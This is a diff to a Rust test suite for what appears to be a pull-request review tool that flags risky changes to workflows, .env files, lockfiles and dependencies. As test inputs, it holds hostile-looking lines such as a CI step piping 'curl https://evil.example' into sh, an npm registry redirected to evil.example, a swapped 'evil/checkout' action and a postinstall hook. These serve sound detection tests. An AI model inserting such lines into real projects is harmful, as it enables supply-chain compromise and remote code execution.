@@ -112,29 +112,15 @@ fn near_api_js_1642_a_package_that_moves_between_sections_with_the_same_range_is
 }
 
 #[test]
-fn constructive_io_blocks_35_a_package_of_this_repository_is_internal_never_a_new_dependency() {
+fn constructive_io_blocks_35_a_package_of_this_repository_added_as_a_dependency_is_a_note_never_a_look() {
     let t = Temp::new();
     let (r, base) = repo(&t, &[("package.json", r#"{"name":"blocks","private":true,"workspaces":["packages/*"]}"#), ("packages/json-renderer/package.json", r#"{"name":"json-renderer","version":"1.0.0"}"#),
         ("packages/flow/package.json", r#"{"name":"flow","dependencies":{"left-pad":"^1.3.0"}}"#)]);
     let head = commit(&r, &[("packages/flow/package.json", r#"{"name":"flow","dependencies":{"left-pad":"^1.3.0","json-renderer":"*","local-helper":"file:../helper","linked":"link:../linked","yarn-portal":"portal:../portal","pinned":"workspace:^"}}"#)], &[]);
     let rules = kern::rules::rules(&r, &base, &head).unwrap();
-    let own = kern::check::own_packages(&r, &head);
-    let now = kern::deps::rfc3339("2026-02-26T00:00:00Z").unwrap();
-    let out = kern::deps::aged(rules, now, &|_: &str, _: &str| None, &|name: &str| own.contains(name));
-    let ages: Vec<String> = out["dependencies"][0]["moves"].as_array().unwrap().iter().map(|m| format!("{} {}", m["name"].as_str().unwrap(), m["age"].as_str().unwrap())).collect();
-    assert_eq!(ages, ["json-renderer internal", "linked internal", "local-helper internal", "pinned internal", "yarn-portal internal"], "{}", out["dependencies"]);
-    let built = receipt::build(&drive_json(), &out, &clean_tests(), &off());
-    assert_eq!(built["decision"], "clear", "the code comes from this repository, where Kern's rules and tests already see it: {built}");
-}
-
-#[test]
-fn a_dependency_on_a_package_the_change_deletes_from_the_repository_comes_from_the_registry() {
-    let t = Temp::new();
-    let (r, _) = repo(&t, &[("package.json", r#"{"name":"app","private":true,"workspaces":["packages/*"],"dependencies":{"@repo/database":"*"}}"#),
-        ("packages/database/package.json", r#"{"name":"@repo/database","version":"1.0.0"}"#)]);
-    let head = commit(&r, &[("package.json", r#"{"name":"app","private":true,"workspaces":["packages/*"],"dependencies":{"@repo/database":"^2.0.0"}}"#)], &["packages/database"]);
-    let own = kern::check::own_packages(&r, &head);
-    assert!(own.contains("app") && !own.contains("@repo/database"), "with the folder gone, npm installs @repo/database from the registry, where anyone can publish that name: {own:?}");
+    assert_eq!(rules["dependencies"][0]["packages"], json!(["json-renderer * (new)", "linked link:../linked (new)", "local-helper file:../helper (new)", "pinned workspace:^ (new)", "yarn-portal portal:../portal (new)"]), "{}", rules["dependencies"]);
+    let built = receipt::build(&drive_json(), &rules, &clean_tests(), &off());
+    assert_eq!((built["decision"].as_str(), look_kinds(&built), note_kinds(&built)), (Some("clear"), vec![], vec!["dependencies".to_string()]), "what moved is listed where a person scans it; nothing Kern measures says more: {built}");
 }
 
 fn caps(path: &str, src: &str) -> Vec<String> { kern::capability::footprint(path, src).unwrap().into_iter().collect() }
@@ -260,8 +246,9 @@ fn a_config_the_runner_kern_runs_reads_or_one_kern_cannot_place_still_needs_a_lo
 fn review_2_b_only_files_that_run_code_or_grant_access_need_a_look() {
     let base = [("package.json", VITEST), ("src/a.js", "export const a = 1;\n"), (".env.development", "PORT=3000\n")];
     let quiet = rules_for(&base, &[(".github/FUNDING.yml", "github: [me]\n"), (".github/assets/logo.png", "PNG"), (".github/screenshot.svg", "<svg/>"), (".github/release.yml", "changelog: {}\n"),
-        (".env.development", "PORT=3001\nNEXT_PUBLIC_SITE_URL=http://localhost:3001\n# local only\n"), (".env.test", "export DEBUG=true\nLOG_LEVEL=info\n")], &[]);
-    assert!(paths(&quiet, "protected").is_empty(), "sponsor links, pictures, release-note headings and local settings neither run code nor grant access: {}", quiet["protected"]);
+        (".env.development", "PORT=3001\nNEXT_PUBLIC_SITE_URL=http://localhost:3001\n# local only\n"), (".env.test", "export DEBUG=true\nLOG_LEVEL=info\n"),
+        (".env.local.example", "OPENAI_API_KEY=\n"), ("apps/web/.env.migrate.example", "DATABASE_PASSWORD=change-me\n")], &[]);
+    assert!(paths(&quiet, "protected").is_empty(), "sponsor links, pictures, release-note headings, local settings and .env templates (eyeread.in#30, maruhi#239) neither run code nor grant access: {}", quiet["protected"]);
     let loud = rules_for(&base, &[(".github/labeler.yml", "safe-to-test: ['**']\n"), (".github/workflows/ci.yml", "on: push\n"), (".env.development", "PORT=3001\nOPENAI_API_KEY=sk-live-123\n"),
         (".env.local", "NODE_OPTIONS=--require ./hook.js\n"), (".env.ci", "npm_config_registry=https://evil.example\n"), (".env.prod", "A=\"multi\nline\"\n"), ("renovate.json", "{\"automerge\": true}\n")], &[]);
     assert_eq!(paths(&loud, "protected"), [".env.ci", ".env.development", ".env.local", ".env.prod", ".github/labeler.yml", ".github/workflows/ci.yml", "renovate.json"],
@@ -307,6 +294,7 @@ fn remix_run_react_router_15628_an_edited_test_file_that_only_gained_tests_needs
 
 fn clean_rules() -> Value { json!({ "changed": [{ "path": "src/total.js", "operation": "modify" }], "powers": [], "tricks": [], "settings": [], "protected": [], "dependencies": [], "agent_notes": [], "not_checked": [] }) }
 fn look_kinds(r: &Value) -> Vec<String> { r["look"].as_array().unwrap().iter().map(|x| x["kind"].as_str().unwrap().to_string()).collect() }
+fn note_kinds(r: &Value) -> Vec<String> { r["notes"].as_array().unwrap().iter().map(|x| x["kind"].as_str().unwrap().to_string()).collect() }
 fn report(tests: &[(&str, u32, u32, u32)]) -> kern::proof::Report {
     kern::proof::Report { tests: tests.iter().map(|(k, p, f, s)| (k.to_string(), kern::proof::Count { passed: *p, failed: *f, skipped: *s })).collect(), ..Default::default() }
 }
@@ -365,15 +353,6 @@ fn review_2_a12_a_long_line_by_line_report_never_pushes_not_checked_off_the_rece
 }
 
 #[test]
-fn constructive_io_blocks_35_the_dependencies_line_says_what_made_each_move_routine() {
-    let mut rules = clean_rules();
-    rules["dependencies"] = json!([{ "path": "packages/flow/package.json", "operation": "modify", "packages": ["json-renderer workspace:^ (new)", "left-pad 1.3.0 → 1.3.1"],
-        "moves": [{ "name": "json-renderer", "from": null, "to": "workspace:^", "age": "internal" }, { "name": "left-pad", "from": "1.3.0", "to": "1.3.1", "age": "routine" }] }]);
-    let md = receipt::markdown(&receipt::build(&drive_json(), &rules, &clean_tests(), &off()), None);
-    assert!(md.contains("✅ Dependencies") && md.contains("from this repository"), "a package of this repository is neither removed nor a release out for a week:\n{md}");
-}
-
-#[test]
 fn a_json_file_that_is_only_reformatted_changes_nothing_that_steers_the_project() {
     let compact = r#"{"extends":["config:base"],"schedule":["before 6am"]}"#;
     let pretty = "{\n  \"extends\": [\"config:base\"],\n  \"schedule\": [\"before 6am\"]\n}\n";
@@ -413,4 +392,113 @@ fn tests_run_next_to_ci_secrets_so_one_that_reads_a_secret_and_reaches_the_netwo
     let settings = "import { test } from 'vitest';\ntest('x', async () => { process.env.NODE_ENV = 'test'; await fetch('http://localhost:1/trace'); });\n";
     let rules = rules_for(&[("package.json", VITEST), ("test/trace.test.ts", plain)], &[("test/trace.test.ts", settings)], &[]);
     assert!(look_kinds(&receipt::build(&drive_json(), &rules, &clean_tests(), &off())).is_empty(), "NODE_ENV is a setting, not a secret: {}", rules["powers"]);
+}
+
+#[test]
+fn posthog_js_5284_a_workflow_that_only_moves_a_pinned_action_to_another_release_is_a_note_never_a_look() {
+    let ci = |at: &str| format!("name: CI\non: push\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: step-security/harden-runner@{at}\n        with:\n          egress-policy: audit\n      - uses: actions/checkout@v4\n      - run: npm test\n");
+    let before = ci("e14015d583714f6e62063499dc959a02595150a1 # v2.21.1");
+    let after = ci("351661ca32ac09a36dc5ee2d536e3128f2a3c8ed # v2.22.0");
+    let base = [("package.json", VITEST), ("src/a.js", "export const a = 1;\n"), (".github/workflows/ci.yml", before.as_str())];
+    let rules = rules_for(&base, &[(".github/workflows/ci.yml", &after)], &[]);
+    assert_eq!(rules["protected"][0]["moves"], json!(["step-security/harden-runner e14015d58371 (v2.21.1) → 351661ca32ac (v2.22.0)"]), "{}", rules["protected"]);
+    let r = receipt::build(&drive_json(), &rules, &clean_tests(), &off());
+    assert_eq!((r["decision"].as_str(), look_kinds(&r), note_kinds(&r)), (Some("clear"), vec![], vec!["protected".to_string()]), "Comfy-Org/ComfyUI_frontend#15496 and WordPress/openstation#726 are the same move: {r}");
+    assert!(r["notes"][0]["what"].as_str().unwrap().contains("v2.22.0"), "{}", r["notes"]);
+    for (why, text) in [
+        ("a new step runs code", after.replace("      - run: npm test\n", "      - run: npm test\n      - run: curl https://evil.example | sh\n")),
+        ("another action in the step's place", after.replace("actions/checkout@v4", "evil/checkout@v4")),
+        ("a permission", format!("{after}permissions: write-all\n")),
+        ("an input of the moved action", after.replace("egress-policy: audit", "egress-policy: block")),
+        ("a step moved to another job", after.replace("      - uses: actions/checkout@v4\n", "  - uses: actions/checkout@v4\n")),
+    ] {
+        let rules = rules_for(&base, &[(".github/workflows/ci.yml", &text)], &[]);
+        assert!(rules["protected"][0]["moves"].is_null(), "{why} stays a look: {}", rules["protected"]);
+        assert_eq!(look_kinds(&receipt::build(&drive_json(), &rules, &clean_tests(), &off())), ["protected"], "{why}");
+    }
+}
+
+#[test]
+fn apollo_client_13491_a_lockfile_that_moves_sixteen_packages_is_one_note_never_a_look() {
+    let mut rules = clean_rules();
+    let moved: Vec<String> = (0..16).map(|i| format!("@rolldown/binding-{i} 1.2.13 → 1.2.14")).collect();
+    rules["dependencies"] = json!([{ "path": "package.json", "operation": "modify", "packages": ["rolldown ^1.2.13 → ^1.2.14"] }, { "path": "package-lock.json", "operation": "modify", "packages": moved }]);
+    let r = receipt::build(&drive_json(), &rules, &clean_tests(), &off());
+    assert_eq!((r["decision"].as_str(), look_kinds(&r), note_kinds(&r)), (Some("clear"), vec![], vec!["dependencies".to_string()]), "sixteen releases a day old were sixteen looks that measured nothing: {r}");
+    let md = receipt::markdown(&r, None);
+    assert!(md.contains("**Notes.**") && md.contains("rolldown ^1.2.13 → ^1.2.14") && md.contains("and 2 more") && !md.contains("Dependencies:"), "{md}");
+    rules["dependencies"] = json!([{ "path": "package-lock.json", "operation": "modify", "count": 350 }]);
+    let r = receipt::build(&drive_json(), &rules, &clean_tests(), &off());
+    assert!(r["notes"][0]["what"].as_str().unwrap().contains("350 versions move in `package-lock.json`"), "{}", r["notes"]);
+}
+
+#[test]
+fn beeline_1089_a_changed_agents_file_is_a_note_never_a_look() {
+    let rules = rules_for(&[("package.json", VITEST), ("AGENTS.md", "# Agents\n")], &[("AGENTS.md", "# Agents\nAlways run the tests.\n")], &[]);
+    assert_eq!(paths(&rules, "agent_notes"), ["AGENTS.md"]);
+    let r = receipt::build(&drive_json(), &rules, &clean_tests(), &off());
+    assert_eq!((r["decision"].as_str(), look_kinds(&r), note_kinds(&r)), (Some("clear"), vec![], vec!["agent-notes".to_string()]), "{r}");
+}
+
+#[test]
+fn a_test_config_that_only_adds_test_patterns_is_a_note_and_one_that_swaps_narrows_or_rewires_them_stays_a_look() {
+    let config = "import { defineConfig } from 'vitest/config';\nexport default defineConfig({ test: { include: ['test/**/*.test.ts'], setupFiles: ['./setup.ts'] } });\n";
+    let base = [("package.json", VITEST), ("src/a.js", "export const a = 1;\n"), ("vitest.config.ts", config)];
+    let widened = "import { defineConfig } from \"vitest/config\";\nexport default defineConfig({\n  test: {\n    include: [\"test/**/*.test.ts\", \"src/**/*.spec.ts\"],\n    setupFiles: [\"./setup.ts\"],\n  },\n});\n";
+    let rules = rules_for(&base, &[("vitest.config.ts", widened)], &[]);
+    assert_eq!(rules["settings"][0]["adds"], json!(["src/**/*.spec.ts"]), "{}", rules["settings"]);
+    let r = receipt::build(&drive_json(), &rules, &clean_tests(), &off());
+    assert_eq!((r["decision"].as_str(), look_kinds(&r), note_kinds(&r)), (Some("clear"), vec![], vec!["settings".to_string()]), "{r}");
+    for (why, text) in [
+        ("a pattern swapped", config.replace("test/**/*.test.ts", "src/**/*.spec.ts")),
+        ("a setup file added", config.replace("setupFiles: ['./setup.ts']", "setupFiles: ['./setup.ts', './mock-everything.ts']")),
+        ("a pattern removed", config.replace("['test/**/*.test.ts']", "[]")),
+        ("a pattern added and a setup file added", widened.replace("[\"./setup.ts\"]", "[\"./setup.ts\", \"./mock.ts\"]")),
+    ] {
+        let rules = rules_for(&base, &[("vitest.config.ts", &text)], &[]);
+        assert!(rules["settings"][0]["adds"].is_null(), "{why}: {}", rules["settings"]);
+        assert_eq!(look_kinds(&receipt::build(&drive_json(), &rules, &clean_tests(), &off())), ["settings"], "{why}");
+    }
+    let jest = rules_for(&[("package.json", JEST), ("src/a.js", "module.exports = 1;\n"), ("jest.config.js", "module.exports = { testMatch: ['**/*.test.js'] };\n")],
+        &[("jest.config.js", "module.exports = { testMatch: ['**/*.test.js', '**/*.spec.js'] };\n")], &[]);
+    assert_eq!(jest["settings"][0]["adds"], json!(["**/*.spec.js"]), "{}", jest["settings"]);
+}
+
+#[test]
+fn a_deleted_lockfile_or_a_new_install_script_still_needs_a_look_and_a_version_move_does_not() {
+    let lock = r#"{"name":"poml","lockfileVersion":3,"packages":{"":{"name":"poml","devDependencies":{"vitest":"3.2.0"}},"node_modules/vitest":{"version":"3.2.0","resolved":"https://registry.npmjs.org/vitest/-/vitest-3.2.0.tgz","integrity":"sha512-abc"}}}"#;
+    let gone = rules_for(&[("package.json", VITEST), ("package-lock.json", lock)], &[], &["package-lock.json"]);
+    let r = receipt::build(&drive_json(), &gone, &clean_tests(), &off());
+    assert_eq!((r["decision"].as_str(), look_kinds(&r)), (Some("look"), vec!["install".to_string()]), "the next install picks versions the lockfile no longer pins: {r}");
+    let hook = VITEST.replace(r#""scripts":{"test":"vitest run"}"#, r#""scripts":{"test":"vitest run","postinstall":"node fetch.js"}"#);
+    let scripted = rules_for(&[("package.json", VITEST)], &[("package.json", &hook)], &[]);
+    let r = receipt::build(&drive_json(), &scripted, &clean_tests(), &off());
+    assert_eq!((look_kinds(&r), note_kinds(&r)), (vec!["install".to_string()], vec![]), "the look names the script, and no note repeats a change in which no package moved: {r}");
+    assert!(r["look"][0]["what"].as_str().unwrap().contains("scripts.postinstall"), "{}", r["look"]);
+    let bumped = rules_for(&[("package.json", VITEST), ("package-lock.json", lock)], &[("package.json", &VITEST.replace("3.2.0", "3.2.4")), ("package-lock.json", &lock.replace("3.2.0", "3.2.4"))], &[]);
+    let r = receipt::build(&drive_json(), &bumped, &clean_tests(), &off());
+    assert_eq!((r["decision"].as_str(), look_kinds(&r), note_kinds(&r)), (Some("clear"), vec![], vec!["dependencies".to_string()]), "{r}");
+    assert!(r["notes"][0]["what"].as_str().unwrap().contains("vitest 3.2.0 → 3.2.4"), "{}", r["notes"]);
+}
+
+#[test]
+fn comfyui_frontend_17136_a_lockfile_kern_does_not_read_is_a_note_and_listed_as_not_checked() {
+    let rules = rules_for(&[("package.json", VITEST), ("pnpm-lock.yaml", "lockfileVersion: '9.0'\n")], &[("pnpm-lock.yaml", "lockfileVersion: '9.0'\nimporters: {}\n")], &[]);
+    assert_eq!(paths(&rules, "not_checked"), ["pnpm-lock.yaml"], "{}", rules["not_checked"]);
+    let r = receipt::build(&drive_json(), &rules, &clean_tests(), &off());
+    assert_eq!((r["decision"].as_str(), look_kinds(&r), note_kinds(&r)), (Some("clear"), vec![], vec!["dependencies".to_string()]), "{r}");
+    assert!(r["not_checked"].as_array().unwrap().iter().any(|x| x["what"].as_str().unwrap().contains("pnpm-lock.yaml")), "{}", r["not_checked"]);
+}
+
+#[test]
+fn eslint_plugin_ember_2853_a_package_manager_version_move_is_a_note_and_create_harper_123_a_new_packages_name_steers_nothing() {
+    let manifest = |manager: &str| format!(r#"{{"name":"eslint-plugin-ember","packageManager":"{manager}","scripts":{{"test":"vitest run"}},"devDependencies":{{"vitest":"3.2.0"}}}}"#);
+    let rules = rules_for(&[("package.json", &manifest("pnpm@10.18.0"))], &[("package.json", &manifest("pnpm@10.19.0"))], &[]);
+    assert_eq!((rules["dependencies"][0]["packages"].clone(), rules["dependencies"][0]["fields"].clone()), (json!(["packageManager pnpm@10.18.0 → pnpm@10.19.0"]), Value::Null), "{}", rules["dependencies"]);
+    let r = receipt::build(&drive_json(), &rules, &clean_tests(), &off());
+    assert_eq!((look_kinds(&r), note_kinds(&r)), (vec![], vec!["dependencies".to_string()]), "{r}");
+    let swapped = rules_for(&[("package.json", &manifest("pnpm@10.18.0"))], &[("package.json", &manifest("yarn@4.5.0"))], &[]);
+    assert_eq!(swapped["dependencies"][0]["fields"], json!(["packageManager"]), "another manager installs by other rules and runs other hooks: {}", swapped["dependencies"]);
+    let added = rules_for(&[("package.json", VITEST)], &[("template-nextjs/package.json", r#"{"name":"template-nextjs","private":true,"dependencies":{"next":"15.0.0"}}"#)], &[]);
+    assert_eq!((added["dependencies"][0]["fields"].clone(), look_kinds(&receipt::build(&drive_json(), &added, &clean_tests(), &off()))), (Value::Null, vec![]), "a new package has a name; nothing is renamed: {}", added["dependencies"]);
 }
